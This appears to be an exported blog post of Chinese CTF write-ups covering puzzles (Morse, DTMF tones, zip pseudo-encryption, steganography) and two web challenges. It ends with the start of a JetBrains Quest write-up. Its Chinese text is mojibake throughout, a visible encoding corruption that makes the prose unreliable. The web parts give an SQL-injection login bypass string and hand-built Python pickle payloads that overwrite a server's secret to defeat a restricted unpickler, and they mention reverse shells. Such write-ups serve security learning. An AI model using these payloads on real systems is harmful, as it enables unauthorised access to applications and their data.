ç»è¿‡æå–å¾—åˆ°ä¸€ä¸ªzipæ–‡ä»¶ã€‚ é‡Œé¢æœ‰ä¸€ä¸ª ctf.txt æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯ ./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-. ä¸€çœ‹æ˜¯æ‘©æ–¯å¯†ç ï¼Œè§£å¯†å¾—åˆ° EPIDEMICSITUATIONOFUNIVERSITYWAR ï¼ˆå—¯ EPIDEMIC SITUATION OF UNIVERSITY WAR å˜›ã€‚é«˜æ ¡æˆ˜ç–«å•¦ã€‚ ä½œä¸ºå¯†ç ï¼Œè§£å‹flag.zipæ–‡ä»¶ï¼Œå¾—åˆ°flag.txt VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ= base64è§£å¯†å¾—åˆ°flagï¼š Th1s_is_FlaG_you_aRE_rigHT éšè—çš„ä¿¡æ¯å‹ç¼©åŒ…é‡Œæœ‰ä¸ªäºŒç»´ç .jpgï¼Œä»¥åŠ çº¯æ•°å­—.zipã€‚ å…¶ä¸­å‹ç¼©åŒ…åŠ å¯†äº†ã€‚ å‘ç°äºŒç»´ç è¢«æ‰£æ‰äº†ä¸‰ä¸ªå®šä½è„šè€Œä¸”åè‰²äº†ï¼Œäºæ˜¯è¡¥å…¨ æ‰«ç å¾—åˆ°ï¼ˆå¯èƒ½è¡¥å¾—ä¸æ˜¯å¾ˆå¥½ï¼Œä½†å‘ç°æ‰‹æœº QQ çš„æ‰«ç çœŸçš„å¼º flag{this_is_also_not_flag} è§£å‹å¯†ç ä¸åœ¨è¿™é‡Œ0.0ï¼ å‡çš„flagï¼å‘ç°å¹¶ä¸èƒ½è§£å‹ã€‚ åŒæ—¶åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨é‡Œçœ‹åˆ°æœ€åæœ‰ä¸€æ®µå­—ç¬¦ä¸²ï¼šTOGETYOURFLAGã€‚ï¼ˆæœ‰ç‚¹æ‡µï¼Œå¥½åƒæ²¡å•¥ç”¨çš„äºšå­ å†çœ‹å›å‹ç¼©åŒ…ï¼Œæ ¹æ®æ–‡ä»¶å çº¯æ•°å­—ï¼Œäºæ˜¯æš´åŠ›è·‘äº†ä¸€æ³¢ï¼Œç„¶è€Œå¹¶ä¸è¡Œã€‚ äºæ˜¯æƒ³åˆ°ä¼ªåŠ å¯†ï¼Œæœç„¶å¦‚æ­¤ã€‚ è§£å‹å¾—åˆ°éšè—çš„ä¿¡æ¯.wavï¼ŒéŸ³é¢‘å†…å®¹å¤§æ¦‚å°±æ˜¯ æˆ‘çš„æ­¦æ±‰å°½å¿«å¥½èµ·æ¥ ä¹‹ç±»çš„ï¼ŒæŒºåº”æ™¯çš„ï¼Œä¹ŸæŒºåŠ±å¿—çš„ã€‚ åœ¨éŸ³é¢‘æœ€åå‘ç°äº†æ¯”è¾ƒå¾®å¼±çš„æ‹¨å·å£°éŸ³ï¼Œçœ‹äº†çœ‹é¢‘åŸŸï¼Œå‘ç°äº†å¦‚ä¸‹çš„é¢‘è°±ã€‚ï¼ˆåœ¨æœ€å‰é¢å’Œæœ€åé¢éƒ½æœ‰è¿™æ ·çš„ä¿¡å·ï¼‰ æ¯ä¸ªæ‹¨å·å£°ç”±ä¸¤ä¸ªé¢‘ç‡å åŠ è€Œæˆã€‚ æƒ³èµ·æ¥åˆšæ”¾å¯’å‡çš„æ—¶å€™æœ‰ä¸ªå­¦å¼Ÿè¿˜é—®è¿‡æ‹¨å·çš„åŸç†ï¼Œé‚£æ—¶å€™è¿˜ç­”ä¸ä¸Šæ¥ï¼ŒæŸ¥äº†åŠå¤©æ²¡æ‰¾åˆ°åˆé€‚çš„èµ„æ–™ã€‚ è¿™æ¬¡å†å»è°·æ­ŒæŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°åŸæ¥è¿™å«åš DTMF ä¿¡å·ã€‚ åŒéŸ³å¤šé¢‘ä¿¡å·ï¼ˆDual-Tone Multi-Frequency, DTMFï¼‰ï¼Œç”µè¯ç³»ç»Ÿä¸­ç”µè¯æœºä¸äº¤æ¢æœºä¹‹é—´çš„ä¸€ç§ç”¨æˆ·ä¿¡ä»¤ï¼Œæœ€å¸¸ç”¨äºå‘æ‹¨å·æ—¶é€è¢«å«å·ç ã€‚ åŒéŸ³å¤šé¢‘çš„æ‹¨å·é”®ç›˜æ˜¯4Ã—4çš„çŸ©é˜µï¼Œæ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªé«˜é¢‘ï¼Œæ¯ä¸€åˆ—ä»£è¡¨ä¸€ä¸ªä½é¢‘ã€‚æ¯æŒ‰ä¸€ä¸ªé”®å°±å‘é€ä¸€ä¸ªé«˜é¢‘å’Œä½é¢‘çš„æ­£å¼¦ä¿¡å·ç»„åˆï¼Œæ¯”å¦‚â€™1â€™ç›¸å½“äº697å’Œ1209èµ«å…¹ï¼ˆHzï¼‰ã€‚äº¤æ¢æœºå¯ä»¥è§£ç è¿™äº›é¢‘ç‡ç»„åˆå¹¶ç¡®å®šæ‰€å¯¹åº”çš„æŒ‰é”®ã€‚ ï¼ˆæ¥è‡ªç»´åŸºç™¾ç§‘ï¼‰ 1209 Hz 1336 Hz 1477 Hz 1633 Hz 697 Hz 1 2 3 A 770 Hz 4 5 6 B 852 Hz 7 8 9 C 941 Hz * 0 # D æœ¬æ¥æƒ³åˆ©ç”¨ç½‘ç»œä¸Šåœ¨çº¿çš„è§£ç å·¥å…·ï¼Œç„¶è€Œå‘ç°ç½‘ç«™ä¸æ˜¯ä¸Šä¸å»å°±æ˜¯åœæ­¢æœåŠ¡äº†ã€‚ï¼ˆå™— é‚£è¿˜æ˜¯è‡ªå·±æ¥å§ã€‚ å¯¹äºæ¯ä¸€ä½å·ç åˆ†åˆ«æŸ¥çœ‹é¢‘è°±ï¼Œæ ¹æ®æœ€æ¥è¿‘çš„ä½é¢‘å’Œé«˜é¢‘ä¿¡å·å¯¹åº”äºè¡¨æ ¼å†…çš„æ•°å­—/å­—æ¯ã€‚ï¼ˆæŒºä½©æœç›´æ¥å°±å¬å‡ºæ¥çš„å¤§ä½¬ å¾—åˆ°éŸ³é¢‘æœ€åé¢è¿™å‡ ä¸ªæ•°å­—ä¸º 5618521ï¼Œæœ€å‰é¢çš„å‡ ä¸ªä¸º 18748ã€‚ å‡‘æˆ flag{187485618521} äº¤ä¸Šå»ï¼Œä¸å¯¹ï¼ éš¾é“ä¸¤éƒ¨åˆ†åäº†ï¼Ÿäºæ˜¯å€’è¿‡æ¥å†è¯•ï¼Œä¸è¡Œã€‚ éš¾é“è¦å€’å™ï¼Ÿä¸è¡Œã€‚ éš¾é“æ˜¯å­—æ¯ï¼Ÿäºæ˜¯è½¬æˆé”®ç›˜ä¸Š1-0å¯¹åº”ç€ä¸‹é¢çš„ä¸€è¡Œå­—æ¯ï¼Œè¯•äº†è¯•ï¼Œä¸è¡Œã€‚ éš¾é“æ˜¯å“ªä¸ªæ•°å­—æé”™äº†ï¼Ÿï¼Ÿï¼Ÿå†ç¡®è®¤äº†ä¸€éï¼Œé˜Ÿå‹ä¹Ÿç¡®è®¤äº†ä¸€éï¼Œå°±æ˜¯è¿™ä¸ªå•Šï¼ˆé»‘è„¸ã€‚ Base64 è§£ç ä¸€ä¸‹ï¼Œä¸å¯¹ä¸å¯èƒ½ã€‚ äºæ˜¯å¡åœ¨è¿™é‡Œäº†ã€‚ çœ‹åˆ°åˆ«äºº WP çš„æ—¶å€™å‘ç°è ¢æ­»äº†ï¼Œæƒ³åˆ° base64 è§£ç æ²¡æƒ³åˆ°åè¿‡æ¥ç¼–ç â€¦â€¦ ç„¶è€Œäººå®¶äºŒç»´ç é‡Œç»™æç¤ºäº†ï¼Œåªæ˜¯æç¤ºä¸åœ¨ç»“å°¾è€Œå·²ã€‚ å‘ï¼ŒUSEBASE64TOGETYOURFLAG. ä¸‹æ¬¡å¾—å…ˆç”¨ strings æ¥çœ‹çœ‹â€¦â€¦ äºæ˜¯ flag å°±æ˜¯ flag{MTg3NDg1NjE4NTIx}ã€‚ æ‰¾èµ„æ–™çš„æ—¶å€™å‘ç°äº†æœ‰å¤§ä½¬åœ¨å•ç‰‡æœºä¸Šå®ç° DTMF è½¯è§£ç çš„ã€‚ åœ¨çº¿ç”ŸæˆæŸç§ç‰¹å®šéŸ³è°ƒçš„ç½‘ç«™ï¼šhttp://onlinetonegenerator.com/dtmf.html å…¶ä»–ä¸€äº›èµ„æ–™ï¼š å¦ä¸€ä¸ªåœ¨çº¿ DTMF ç”Ÿæˆå·¥å…· DTMF Tone Generator ä¸€ä¸ªåœ¨çº¿ DTMF è§£ç å·¥å…· Detect DTMF Tonesï¼ˆå¥½åƒä¸Šä¸å»ï¼‰ DTMF ç¼–ç åŠè§£ç  GitHubé¡¹ç›®ï¼š DTMF_Detector ğŸ“ Using Matlab to simulate Dual-Tone Multi-Frequency (DTMF) of telephone DTMF-Detection-Goertzel-Algorithm- DTMF detection system developed on AVR Atmega128 board based on Goertzel algorithm æ­¦æ±‰åŠ æ²¹å‘ç°é™„ä»¶åªæœ‰ä¸€å¼ å›¾ç‰‡â†“ã€‚ é¦–å…ˆç¥æ­¦æ±‰åŠ æ²¹ï¼Œä¸­å›½åŠ æ²¹ï¼Œå‘åŒ»æŠ¤äººå‘˜è‡´æ•¬ã€‚ å‘ç°äº†æ–‡ä»¶æ‹¼æ¥äº†ä¸€ä¸ª RAR æ–‡ä»¶ï¼Œforemost æå–ä¸å‡ºæ¥ï¼Œæ‡’å¾—å¼€ Ubuntu ç”¨ binwalk äº†ï¼Œäºæ˜¯ç›´æ¥æ‰‹åŠ¨æå–å‡ºå‹ç¼©åŒ…ã€‚ å¾—åˆ°ä¸€ä¸ªflag.exe. ä»€ä¹ˆï¼ŸMISC é¢˜è¿˜è¦ REï¼Ÿï¼Ÿï¼Ÿ ç„¶è€Œçœ‹äº†ä¸€ä¸‹å‘ç°è§£ä¸äº†ï¼Œå¥½åƒåŠ å£³äº†ã€‚ éšä¾¿çŒœäº†ä¸€ä¸‹å’Œæ­¦æ±‰åŠ æ²¹ç›¸å…³çš„ flag äº¤ä¸Šå»ï¼Œéƒ½ä¸å¯¹â€¦â€¦ çœ‹äº†å¤§ä½¬ä»¬çš„ WP å‘ç°æ˜¯ flag{zhong_guo_jia_you} â€¦ ä¸­å›½åŠ æ²¹ï¼ ï¼ˆä½©æœç›´æ¥çŒœå‡ºæ¥çš„ï¼‰ åŸæ¥å›¾ç‰‡é‡Œè¿˜éšå†™äº†å¯†ç ï¼Œç”¨ steghide çˆ†ç ´æå–å‡º ï¬‚ag.txtï¼Œå¯ä»¥å¾—åˆ°å¯†ç ' æ­¦ æ±‰ åŠ  æ²¹ !ï¼Œè¾“å…¥åˆ° flag.exeå°±å¯ä»¥å¾—åˆ° flagã€‚ï¼ˆemmm ez_mem&amp;usbMISC æ˜¯çœŸçš„æ‚â€¦â€¦ captured.pcapæŠ“åŒ…æ–‡ä»¶ï¼Œå¯ä»¥åœ¨ä¸€å †æµé‡ä¸­æå–å‡ºä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„é¡µé¢upload_file.phpã€‚ ä»æäº¤çš„ form é‡Œå¯ä»¥æå–å‡ºä¸€ä¸ª data.zip. å‹ç¼©åŒ…é‡Œæ˜¯ä¸€ä¸ª data.vmemï¼Œå™«ä¸€ä¸ªè™šæ‹Ÿæœºå†…å­˜é•œåƒã€‚ æ‡µäº†ï¼Œæ²¡ç©è¿‡å†…å­˜å–è¯çš„é¢˜ç›®å”‰ï¼ˆå¥½èœå•Š çœ‹é¢˜ç›®åé¢åº”è¯¥è¿˜éœ€è¦æå– USB çš„æ•°æ®ï¼Œå¤§æ¦‚ flag åœ¨ USB æ•°æ®é‡Œå§ã€‚ åé¢æœ‰ç©ºå†å­¦å­¦ volatility å†…å­˜å–è¯ã€‚ Websqlcheckin http://121.37.161.79:8005 å°±æ˜¯è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ç™»å½•é‚£ç§ï¼Œç”¨ PHP çš„ PDO æ¥è¿æ¥æ•°æ®åº“ã€‚ç”¨æˆ·åéœ€è¦ä¸ºadminã€‚ æ¯•ç«Ÿæ˜¯ checkin é¢˜ï¼Œæ„Ÿè§‰åº”è¯¥ä¸ä¼šå¤ªéš¾ã€‚ç„¶è€Œè¯•äº†è¯•å¸¸ç”¨çš„ä¸‡èƒ½å¯†ç å‘ç°å¹¶æ²¡æœ‰æ•ˆæœï¼Œéƒ½è¢« Deny äº†ã€‚ ç„¶åé˜Ÿå‹åœ¨ç½‘ä¸Šæœåˆ°äº†åŸé¢˜â€”â€” æ¹–å—çœç¬¬ä¸‰å±Šå¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨æ°´èµ›WriteUp. '-0-'å¯ä»¥ä»£æ›¿'or'1ç»•è¿‡ã€‚äºæ˜¯æ„é€ å‚æ•°å¦‚ä¸‹å³å¯ã€‚ username=admin&amp;password='-0-' ç«‹ä¸ª flagï¼Œåé¢å¥½å¥½å­¦ä¸€ä¸‹ SQLï¼ˆ webtmp http://121.36.222.22:10019/ æºç ï¼š import base64 import io import sys import pickle from flask import Flask, Response, render_template, request app = Flask(__name__) class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f'Animal(name={self.name!r}, category={self.category!r})' def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() def read(filename, encoding='utf-8'): with open(filename, 'r', encoding=encoding) as fin: return fin.read() @app.route('/', methods=['GET', 'POST']) def index(): if request.args.get('source'): return Response(read(__file__), mimetype='text/plain') if request.method == 'POST': try: pickle_data = request.form.get('data') if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return 'Are you sure that is an animal???' correct = (result == Animal(secret.name, secret.category)) return render_template('unpickle_result.html', result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return \"Something wrong\" sample_obj = Animal('mmm','aaaa') pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template('unpickle_page.html', sample_obj=sample_obj, pickle_data=pickle_data) if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) ï¼ˆå¯èƒ½æœ‰äº›åœ°æ–¹è¢«æˆ‘ä¸å°å¿ƒæ”¹äº† çœ‹åˆ° pickle æƒ³åˆ°äº†ååºåˆ—åŒ–ï¼Œä¹‹å‰åªå¬è¯´è¿‡ PHP æœ‰ååºåˆ—åŒ–æ¼æ´ï¼Œè¿™é‡Œæ‰çŸ¥é“åŸæ¥ python ä¹Ÿæœ‰ã€‚ è¿™æ¬¡æ­£å¥½å°±æ¥äº†è§£ä¸€ä¸‹ pickle ååºåˆ—åŒ–å§ã€‚ åé¢å†è®°ä¸€ä¸‹è¿™ä¸€å—çš„ç¬”è®°å§ï¼ˆå¤§æ¦‚ç‡å’•å’•å’• å¯ä»¥ç”¨ pickletools è¿™ä¸ªåæ±‡ç¼–å·¥å…·æ¥å¸®åŠ©ç†è§£ pickle ä»£ç ï¼Œå³opcode ã€‚ æ¯”å¦‚è¿™é‡ŒæŠŠnameè®¾æˆ 'mmm'ï¼Œcategoryè®¾ä¸º 'aaaa'ï¼Œè€Œåç”Ÿæˆ pickleï¼Œå¯ä»¥çœ‹åˆ°å„ä¸ªå‘½ä»¤çš„å«ä¹‰ã€‚ $ python3 -m pickletools -a ./data 0: \\x80 PROTO 3 Protocol version indicator. 2: c GLOBAL '__main__ Animal' Push a global object (module.attr) on the stack. 19: q BINPUT 0 Store the stack top into the memo. The stack is not popped. 21: ) EMPTY_TUPLE Push an empty tuple. 22: \\x81 NEWOBJ Build an object instance. 23: q BINPUT 1 Store the stack top into the memo. The stack is not popped. 25: } EMPTY_DICT Push an empty dict. 26: q BINPUT 2 Store the stack top into the memo. The stack is not popped. 28: ( MARK Push markobject onto the stack. 29: X BINUNICODE 'name' Push a Python Unicode string object. 38: q BINPUT 3 Store the stack top into the memo. The stack is not popped. 40: X BINUNICODE 'mmm' Push a Python Unicode string object. 48: q BINPUT 4 Store the stack top into the memo. The stack is not popped. 50: X BINUNICODE 'category' Push a Python Unicode string object. 63: q BINPUT 5 Store the stack top into the memo. The stack is not popped. 65: X BINUNICODE 'aaaa' Push a Python Unicode string object. 74: q BINPUT 6 Store the stack top into the memo. The stack is not popped. 76: u SETITEMS (MARK at 28) Add an arbitrary number of key+value pairs to an existing dict. 77: b BUILD Finish building an object, via __setstate__ or dict update. 78: . STOP Stop the unpickling machine. highest protocol among opcodes = 2 çœ‹äº†åŠå¤©ååºåˆ—åŒ–æ¼æ´ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯åˆ©ç”¨__reduce__æ–¹æ³•æ¥å®ç°ä»»æ„ä»£ç çš„æ‰§è¡Œã€‚ å¦‚æœæ²¡æœ‰è¾“å‡ºçš„è¯ï¼Œå¯ä»¥åå¼¹ shell åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œåˆ©ç”¨ç½‘ç«™è®¿é—®æ—¥å¿—æ¥å¾—åˆ°éœ€è¦çš„ä¿¡æ¯ã€‚ ï¼ˆè¿™æ—¶æˆ‘çœ‹äº†çœ‹æœåŠ¡å™¨çš„ nginx logï¼Œå‘ç°æ—¥å¸¸è¢«æ‰«ï¼Œå¸¸è§çš„ adminã€phpmyadmin ç›®å½•ï¼Œç”šè‡³è¿˜æœ‰æƒ³è·¨ç«™æ‰§è¡Œ rm -rf / çš„â€¦â€¦ è¯è¯´å›æ¥ï¼Œå½“æˆ‘å†™å¥½ __reduce__ æ–¹æ³• post ä¸Šå»ä¹‹åï¼Œå‘ç°è¢«æ‹’ç»äº†ã€‚ä¸è¿‡ä»£ç é‡Œä¹Ÿæœ‰ä½“ç°ã€‚ ç„¶è€Œæƒ³è¦å°† callable å¯¹è±¡æ‰§è¡Œéƒ½å¿…é¡»è¦è°ƒç”¨ reduceï¼Œåœ¨ pickle ä¸­éƒ½ä¼šæ¶‰åŠ R è¿™ä¸ªå­—æ¯ã€‚ äºæ˜¯ä¹ä¸èƒ½åœ¨æœåŠ¡å™¨ä¸Šé€šè¿‡æ‰§è¡Œè‡ªå·±çš„ä»£ç æ¥è·å– flagã€‚ åé¢çªç„¶æƒ³åˆ°ï¼Œä½ ä¸è®©æˆ‘ RCEï¼Œæˆ‘å¯ä»¥æ”¹æ‰ä½ çš„ secret ä¸­çš„ name å’Œ category å•Šï¼ è¿™é‡Œè¦æ‰‹æ“ pickle äº†ã€‚å½“æ—¶çš„æ€è·¯æ˜¯è°ƒç”¨ secret æ¨¡å—çš„å†…å®¹å¯¹ Animal è¿›è¡Œå®ä¾‹åŒ–ã€‚ç„¶è€Œæ¯”è¾ƒèœï¼Œä¸çŸ¥é“ä¸ºå•¥å‡ºäº†ç‚¹é—®é¢˜ã€‚ åæ¥åˆæƒ³åˆ°è¯»å– secret æ–‡ä»¶è¯»å–å±æ€§ä¿¡æ¯è¿›è€Œè·å– flagï¼Œä¸è¿‡æ²¡æœ‰å…·ä½“çš„æ€è·¯ï¼Œäºæ˜¯åˆ°è¿™é‡Œå°±å¡ä½äº†ã€‚ åæ¥çœ‹åˆ°å¤§ä½¬çš„ WPï¼Œå‘ç°æœç„¶æ˜¯**ç›´æ¥æ”¹æ‰è¿™ä¸ªsecret**ã€‚ ä¸è¿‡å…·ä½“ä¸æ˜¯è°ƒç”¨ secret æ¨¡å—ï¼Œè€Œæ˜¯ç›´æ¥åœ¨ __main__ ä¸‹å»ºä¸€ä¸ªè‡ªå·±çš„secretç±»ï¼Œè®¾ç½®è‡ªå·±çš„å±æ€§ï¼Œè¦†ç›–æ‰ import è¿›æ¥çš„secretã€‚å†åˆ©ç”¨è‡ªå·±è®¾ç½®çš„å±æ€§ä¿¡æ¯å»æ ¡éªŒå°±å®Œäº‹äº†ã€‚ payload = b\"\\x80\\x03c__main__\\nsecret\\n} (X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00233X\\x08\\x00\\x00\\x00categoryX\\x03\\x00\\x 00\\x00233ub0c__main__\\nAnimal\\n)\\x81} (X\\x04\\x00\\x00\\x00nameq\\x03X\\x03\\x00\\x00\\x00233X\\x08\\x00\\x00\\x00categoryX\\x03\\ x00\\x00\\x00233ub.\" å¦ä¸€ä¸ª payloadï¼š b\"c__main__\\nsecret\\np0\\n0g0\\n(}(S'name'\\nS'asd'\\ndtbg0\\n(}(S'category'\\nS'123'\\ndtb\\x80\\x04\\x95=\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x06Animal\\x94\\x93\\x94)\\x81\\x94}\\x94(\\x8c\\x04name\\x94\\x8c\\x03asd\\x94\\x8c\\x08category\\x94\\x8c\\x03123\\x94ub.\" # base64 Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2FzZCcKZHRiZzAKKH0oUydjYXRlZ29yeScKUycxMjMnCmR0YoAElT0AAAAAAAAAjAhfX21haW5fX5SMBkFuaW1hbJSTlCmBlH2UKIwEbmFtZZSMA2FzZJSMCGNhdGVnb3J5lIwDMTIzlHViLg== ä¸‹é¢è¿™ä¸ªé“¾æ¥é‡Œæœ‰å…³äº pickle åŠå…¶ååºåˆ—åŒ–æ¼æ´çš„æ›´å®Œæ•´çš„ä»‹ç»ã€‚ ğŸ Security Issues in Python Pickle ï¼ˆScientific Network needed What is serialization, How to serialize data, Pickle in CTF Challenges, Implementation of Pickle, Vulnerabilities in Wild, Mitigation strategies &amp;&amp; Best practicesâ€¦ é‡Œé¢è®²åˆ°äº†å‡ ä¸ªä¾‹é¢˜ 2019-SJTU-Pickle2019-SJTU-Pickle-Revenge-Back2018-HITB-Python-Revenge2019-SJTU-Pickle-Revenge ï¼ˆâ†è¿™ä¸ªé¢˜å°±å’Œè¿™é‡Œè¿™é¢˜å‡ ä¹ä¸€ä¸ªå¥—è·¯ ä¸å…è®¸Rï¼Œä»–è¿™é‡Œçš„æ³¨å…¥æ€è·¯ä¹Ÿæ˜¯è°ƒç”¨ secret æ¨¡å—çš„å†…å®¹å¯¹ Animal è¿›è¡Œå®ä¾‹åŒ–ï¼Œæœ‰ç‚¹æƒ³ä¸æ˜ç™½æˆ‘å†™çš„å“ªé‡Œå‡ºé—®é¢˜äº†ï¼ˆ ä»–è¿˜è¿›ä¸€æ­¥å®ç°äº†å¯¹æ–‡ä»¶çš„è¯»å–ã€‚æœ€åçš„ç»“è®ºæ˜¯ï¼Œæ”¾å¼ƒä½¿ç”¨pickleã€‚æ¯•ç«Ÿå¤ªå±é™©äº†å‘€ï¼ Extensive Reading: Python Pickleçš„ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´å®è·µå’ŒPayloadæ„é€  ç»•è¿‡ RestrictedUnpickler Pythonååºåˆ—åŒ–æ¼æ´çš„èŠ±å¼åˆ©ç”¨ å…³äºPython secçš„ä¸€äº›ç®€å•çš„æ€»ç»“ Elseå…¶ä»–çš„é¢˜å¤§æ¦‚çœ‹äº†çœ‹ã€‚ã€‚ä¸è¿‡æ²¡ä»€ä¹ˆæ€è·¯æˆ–è€…æœ‰æ€è·¯ä¸çŸ¥é“æ€ä¹ˆå®ç°ï¼Œå¥½èœå•Šâ€¦â€¦ ï¼ˆæ€ä¹ˆå¤§ä½¬ä»¬åŠ¨ä¸åŠ¨éšæ‰‹å°±ä¸€ä¸ª payload æå®šäº†å˜¤å˜¤å˜¤ å°ç»“å†å›è¿‡å¤´æ¥çœ‹è¿™æ¬¡ CTF çš„æ¯”èµ›åç§°ï¼Œé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›ã€‚ è¿˜æ˜¯æŒºæœ‰æ„æ€çš„å§ã€‚ä¸»é¢˜ç»“åˆäº†å½“ä¸‹çš„çƒ­ç‚¹ï¼Œé¢˜ç›®ä¹Ÿæ¯”è¾ƒåº”æ™¯ï¼Œä¹ŸæŒºæ­£èƒ½é‡çš„ã€‚ COVID-19 é¢å‰ï¼Œä¸ä»…ä»…éœ€è¦ä¸­å›½åŠªåŠ›ï¼Œæ›´éœ€è¦å…¨ä¸–ç•Œä¸€èµ·è¡ŒåŠ¨èµ·æ¥ï¼Œå…±åŒä¸ç–«æƒ…è¿›è¡Œè¾ƒé‡ã€‚ è¿™æ˜¯æ•´ä¸ªäººç±»å…±åŒé¢ä¸´çš„å›°éš¾å’ŒæŒ‘æˆ˜ï¼Œä»ä¸­ä¹Ÿæ›´èƒ½æ„è¯†åˆ°äººç±»å‘½è¿å…±åŒä½“çš„å«ä¹‰äº†ã€‚ æ­¦æ±‰åŠ æ²¹ï¼Œä¸­å›½åŠ æ²¹ï¼Œä¸–ç•ŒåŠ æ²¹ï¼ å†çœ‹ CTFï¼Œæ„Ÿè§‰æ¶‰åŠçš„é¢ä¸æ˜¯ä¸€èˆ¬çš„å¹¿ï¼Œæ›´å¤šçš„æ˜¯æƒ³æ¥å­¦ç‚¹ä¸œè¥¿å§ï¼Œä½ çœ‹äººå®¶å¤§ä½¬éƒ½æ¯”ä½ å‰å®³å‘¢ã€‚ å…¶ä¸­çš„ MISC é¢˜ç»å¸¸éœ€è¦ä¸å°çš„è„‘æ´ï¼Œæ¯”å¦‚ æ­¦æ±‰åŠ æ²¹ã€éšè—çš„ä¿¡æ¯ ä¹‹ç±»çš„é¢˜ç›®å°±æ˜¯å‘¢ã€‚ æˆ–è®¸è¿™å°±æ˜¯CTFçš„é­…åŠ›å§ï¼ å¯èƒ½æ–‡ä¸­æœ‰çš„è¡¨è¿°ä¸å¤§ä¸¥è°¨ï¼Œä¸è¦å¤ªåœ¨æ„ï¼ˆ è¿™ç¯‡å…¶å®å†™çš„ä¹Ÿå¾ˆæ°´ ï¼ˆæºœ","path":"2020/03/15/CTF_2020XCTF_gxzy/"},{"title":"CTF | JetBrains Quest 3 WriteUp/æ”»ç•¥","text":"Causeæ™šä¸Šçœ‹åˆ° JetBrains æœ€åä¸€ä¸ª Quest å‡ºæ¥äº†ï¼Œäºæ˜¯ç»§ç»­æ¥è§£ä¸ªè°œå§ï¼ å‰ä¸¤ä¸ª JetBrainsQuest çš„ WriteUp åœ¨è¿™é‡Œâ†“å‘¢ã€‚ CTF | JetBrains Quest 1&amp;2 WriteUp/æ”»ç•¥ è¿™æ¬¡çš„éš¾åº¦æ¯”ä¸Šæ¬¡è¦å¤§ä¸€äº›ï¼Œä¸è¿‡æ€»ä½“è€Œè¨€ä¹Ÿä¸å¤ªéš¾å•¦ã€‚ ATTENTION! ä¸‹é¢çš„å†…å®¹ æ¶‰åŠå‰§é€ï¼ å¦‚æœæƒ³è‡ªå·±åšçš„è¯ï¼Œå°±æš‚æ—¶ä¸è¦å¾€ä¸‹çœ‹äº†ï¼ Step 1æ¨ç‰¹åœ°å€ï¼š https://twitter.com/jetbrains/status/1238420744817782784 å™«ï¼è¿™æ˜¯æœ€åä¸€ä¸ª quest äº†ï¼æ¥è§£å¯†å§~ SGF2ZSB5b3Ugc2VlbiB0aGUgcG9zdCBvbiBvdXIgSW5zdGFncmFtIGFjY291bnQ/ base64 è§£å¯†å¾—åˆ° Have you seen the post on our Instagram account? å» Instagram æ‰¾æ‰¾çº¿ç´¢ã€‚ Step 2å‰å¾€ JetBrains çš„Insï¼š https://www.instagram.com/jetbrains/ ç¬¬ä¸€å¼ å›¾å°±æ˜¯ç†Ÿæ‚‰çš„ Quest é¢†å–ç¦åˆ©çš„é¡µé¢èƒŒæ™¯äº†ã€‚ ï¼ˆç•™ä¸ªå¤‡ä»½é“¾æ¥ Welcome to the final Quest! You should start on the Kotlin Playground: https://jb.gg/kotlin_questP.S. If you donâ€™t know about the #JetBrainsQuest, itâ€™s not too late to find out. å¾—åˆ°ä¸€ä¸ªç½‘å€ï¼šhttps://jb.gg/kotlin_quest Step 3è®¿é—®ä¸Šé¢çš„ç½‘å€ï¼Œå‘ç°è·³è½¬åˆè·³è½¬ï¼Œæœ€ç»ˆæ¥åˆ°äº†ä¸€ä¸ª Kotlin åœ¨çº¿ç¼–ç¨‹é¡µé¢ã€‚ å°±æ˜¯ä»–è¯´çš„ the Kotlin Playground å§ã€‚ åœ°å€åœ¨è¿™é‡Œ ï¼ˆé“¾æ¥å¤ªé•¿äº†å°±ä¸æ˜¾ç¤ºå‡ºæ¥å¥½äº† fun main() { val s = \"Zh#kdyh#ehhq#zrunlqj#552:#rq#wkh#ylghr#iru#wkh#iluvw#hslvrgh#ri#wkh#SksVwrup#HDS1#Li#zh#jdyh#|rx#d#foxh/#lw#zrxog#eh#hdv|#dv#sl1\" val n: Int = TODO() for (c in s) { print(c - n) } } è¿™ä¸ªå«ä¹‰å¾ˆæ˜æ˜¾å‘¢ã€‚å°±æ˜¯æŠŠå­—ç¬¦ä¸² s æ¯ä¸ªå­—æ¯å¾€å‰ç§»åŠ¨ n ä¸ªå­—ç¬¦å¥½äº†ã€‚ï¼ˆi.e. SHIFTxï¼Œå‡¯æ’’å¯†ç ä¹‹ç±»çš„ï¼‰ æˆ‘ä¹Ÿä¸è®°å¾— n æ˜¯å¤šå°‘äº†emmmï¼Œåæ­£ä¸ªä½æ•°å§ï¼Œè¯•ä¸€è¯•å°±å‡ºæ¥äº†ã€‚ äºæ˜¯å¾—åˆ° We have been working 22/7 on the video for 